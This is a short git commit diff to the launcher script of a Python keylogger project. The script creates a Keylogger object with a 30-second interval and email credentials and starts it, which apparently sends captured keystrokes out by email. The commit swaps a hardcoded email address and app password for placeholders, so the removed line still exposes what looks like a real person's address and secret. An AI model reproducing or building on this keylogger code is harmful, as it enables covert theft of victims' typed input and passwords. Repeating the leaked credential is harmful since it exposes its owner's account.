8b88378ef1a28da48a1f14621de10d50bb972406
Ferrozo <61892198+Ferrozo@users.noreply.github.com>
2022-04-07 10:51:45 +0100

    Update kylogger.py

--- key_logger/kylogger.py
+++ key_logger/kylogger.py
@@ -2,5 +2,5 @@
 
 import key_logger
 
-my_keylogger = key_logger.Keylogger(30, "wilson.geral.c@gmail.com", "ftnuddowoytcxsbv")
+my_keylogger = key_logger.Keylogger(30, "YOUR_EMAIL_HERE", "APP_KEY_BY_YOUR_PROVIDER")
 my_keylogger.start()
